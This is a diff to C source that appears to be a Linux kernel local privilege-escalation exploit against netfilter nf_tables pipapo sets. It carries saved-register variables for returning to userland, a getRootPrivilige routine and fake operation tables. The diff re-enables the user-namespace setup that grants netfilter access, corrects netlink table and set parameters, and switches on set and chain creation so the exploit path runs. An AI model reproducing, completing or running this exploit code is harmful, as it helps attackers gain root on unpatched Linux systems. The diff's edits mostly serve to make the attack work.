@@ -7,6 +7,8 @@
 #include <unistd.h>
 #include <sched.h>
 #include <sys/types.h>
+#include <errno.h>
+#include <sys/mount.h>
 #include <linux/keyctl.h>
 
 size_t user_cs, user_ss, user_rflags, user_sp;
@@ -53,26 +55,61 @@ void err_exit(char *s){
 }
 void unshare_setup(void)
 {
-    return ;
     char edit[0x100];
     int tmp_fd;
+    ssize_t n;
+    uid_t uid = getuid();
+    gid_t gid = getgid();
 
-    if(unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))
-        err_exit("FAILED to create a new namespace");
+    /*
+     * Create a user namespace first, then map our real uid/gid to 0 inside it.
+     * Unsharing other namespaces (net/mount) is more reliable after the mapping
+     * is in place.
+     */
+    if (unshare(CLONE_NEWUSER) < 0)
+        err_exit("unshare(CLONE_NEWUSER)");
 
     tmp_fd = open("/proc/self/setgroups", O_WRONLY);
-    write(tmp_fd, "deny", strlen("deny"));
-    close(tmp_fd);
+    if (tmp_fd >= 0) {
+        if (write(tmp_fd, "deny", strlen("deny")) != (ssize_t)strlen("deny"))
+            err_exit("write(/proc/self/setgroups)");
+        close(tmp_fd);
+    } else if (errno != ENOENT) {
+        err_exit("open(/proc/self/setgroups)");
+    }
 
     tmp_fd = open("/proc/self/uid_map", O_WRONLY);
-    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
-    write(tmp_fd, edit, strlen(edit));
+    if (tmp_fd < 0)
+        err_exit("open(/proc/self/uid_map)");
+    n = snprintf(edit, sizeof(edit), "0 %u 1\n", (unsigned)uid);
+    if (n <= 0 || n >= (ssize_t)sizeof(edit))
+        err_exit("snprintf(uid_map)");
+    if (write(tmp_fd, edit, n) != n)
+        err_exit("write(/proc/self/uid_map)");
     close(tmp_fd);
 
     tmp_fd = open("/proc/self/gid_map", O_WRONLY);
-    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
-    write(tmp_fd, edit, strlen(edit));
+    if (tmp_fd < 0)
+        err_exit("open(/proc/self/gid_map)");
+    n = snprintf(edit, sizeof(edit), "0 %u 1\n", (unsigned)gid);
+    if (n <= 0 || n >= (ssize_t)sizeof(edit))
+        err_exit("snprintf(gid_map)");
+    if (write(tmp_fd, edit, n) != n)
+        err_exit("write(/proc/self/gid_map)");
     close(tmp_fd);
+
+    /* Become uid/gid 0 inside the new user namespace. */
+    if (setresgid(0, 0, 0) < 0)
+        err_exit("setresgid(0)");
+    if (setresuid(0, 0, 0) < 0)
+        err_exit("setresuid(0)");
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWNET) < 0)
+        err_exit("unshare(CLONE_NEWNS|CLONE_NEWNET)");
+
+    /* Don't let mounts propagate back to the parent mount namespace. */
+    if (mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) < 0)
+        err_exit("mount(MS_PRIVATE)");
 }
 
 void getRootPrivilige(void)
@@ -139,7 +176,7 @@ void create_table(int sock, const char *name) {
     nlh->nlmsg_seq = 0;
 
     nfm = NLMSG_DATA(nlh);
-    nfm->nfgen_family = 5;//NFPROTO_INET;
+    nfm->nfgen_family = NFPROTO_INET;
 
     /** Prepare associated attribute **/
     attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
@@ -275,7 +312,7 @@ void create_pipapo_set(int sock){
                     "NFTA_SET_FIELD_LEN":4
                 },
                 "NFTA_LIST_ELEM@1":{
-                    "NFTA_SET_FIELD_LEN":7
+                    "NFTA_SET_FIELD_LEN":4
                 }
             }
         }
@@ -739,7 +776,7 @@ void del_set_elem(int sock){
 
 size_t data[0x1000];
 size_t fake_ops[0x100];
-int sock;
+
 
 void create_set(int sock, const char *set_name, uint32_t set_keylen, uint32_t data_len, const char *table_name, uint32_t id) {
     struct msghdr msg;
@@ -932,14 +969,18 @@ int main(){
     unshare_setup();
 
     mypid = getpid();
+    int sock;
 
     if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
         perror("socket");
     }
     printf("[+] Netlink socket created\n");
 
+    
+
     create_table(sock, "my_table");
-    //create_pipapo_set(sock);
+    create_pipapo_set(sock);
+    create_chain(sock, "my_table", "my_chain");
     
     
     
@@ -951,4 +992,3 @@ int main(){
     
     
 }
-
